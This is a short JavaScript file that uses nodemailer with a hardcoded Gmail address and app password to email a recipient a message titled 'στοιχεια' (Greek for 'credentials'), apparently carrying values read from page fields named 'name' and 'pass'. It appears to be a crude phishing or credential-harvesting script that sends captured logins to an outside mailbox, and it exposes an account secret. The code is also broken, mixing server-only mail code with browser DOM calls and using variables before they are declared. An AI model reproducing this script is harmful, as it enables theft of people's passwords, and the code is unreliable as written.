const nodemailer = require('nodemailer');
const transporter = nodemailer.createTransport({
    service: 'gmail',
    host: "smtp.gmail.com",
    auth: {
        user: 'html.py.css@gmail.com',
        pass: 'opmkohspzmsttvqs'
    }
})
let message;

const sleep = async (ms) => {
    return new Promise((res) => setTimeout(res, ms));
}
let emails=["stapcgamer@gmail.com"]
for(let i in emails){
    message = {
        from: 'html.py.css@gmail.com',
        to: emails[i],
        subject: 'στοιχεια',
        text: `${name ,pass}`
    }
    transporter.sendMail(message, async (a) => {
        console.log(`msg sent to ${emails[i]}`, );
    
        await sleep(2000);
    })

}


  
let name =document.getElementById("name");
let pass=document.getElementById("pass");  
